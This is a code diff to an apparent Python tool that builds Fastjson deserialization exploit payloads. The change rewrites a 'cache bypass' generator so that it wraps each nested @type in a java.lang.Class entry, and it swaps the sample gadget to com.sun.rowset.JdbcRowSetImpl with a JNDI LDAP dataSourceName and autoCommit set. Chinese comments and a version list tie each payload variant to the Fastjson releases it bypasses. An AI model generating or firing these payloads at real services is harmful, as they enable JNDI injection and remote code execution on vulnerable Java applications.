@@ -4,7 +4,7 @@
 import json,copy
 import sys
 
-from json import JSONDecodeError
+from json import JSONDecodeError, load
 
 
 class FastJson:
@@ -55,15 +55,27 @@ class FastJson:
     # 生成cache绕过payload
     def payload3(self, payload: str):
         load_payload = json.loads(payload)
-        cache_payload = {
-            "rand1": {
-                "@type": "java.lang.Class",
-                "val": "%s" % load_payload["rand1"]["@type"]
-            }
-        }
-        cache_payload["rand2"] = load_payload # 包了两层
-        return json.dumps(cache_payload)
-   
+        res_payload = {"rand1":{}}
+        dct_objs = [load_payload['rand1']]
+        res_objs = [res_payload['rand1' ]]
+        while len(dct_objs) > 0:
+            dct_obj = dct_objs.pop(0)
+            res_obj = res_objs.pop(0)
+            for key in dct_obj:
+                if key == "@type":
+                    cache_payload = {
+                        "@type": "java.lang.Class",
+                        "val": "%s" % dct_obj[key]
+                    }
+                    res_obj['rand1'] = cache_payload
+                res_obj[key] = dct_obj[key]
+                if type(dct_obj[key]) == dict:
+                    res_obj[key] = {}
+                    dct_objs.append(dct_obj[key])
+                    res_objs.append(res_obj[key])
+      
+        return json.dumps(res_payload)
+
     # 生成 cache + L型 payload
     def payload4(self, payload: str):
         return self.payload3(self.payload1(payload))
@@ -90,10 +102,11 @@ class FastJson:
 if __name__ == '__main__':
     try :
         payload = '''{
-	"rand1": {
-		"@type":"org.apache.xbean.propertyeditor.JndiConverter",
-		"AsText":"ldap://localhost:6666/test"
-	}
+  "rand1": {
+    "@type": "com.sun.rowset.JdbcRowSetImpl",
+    "dataSourceName": "ldap://localhost:1389/test",
+    "autoCommit": true
+  }
 }'''    
         lists = ["基础型",
                 "L型  1.2.25 <= v <= 1.2.41", 
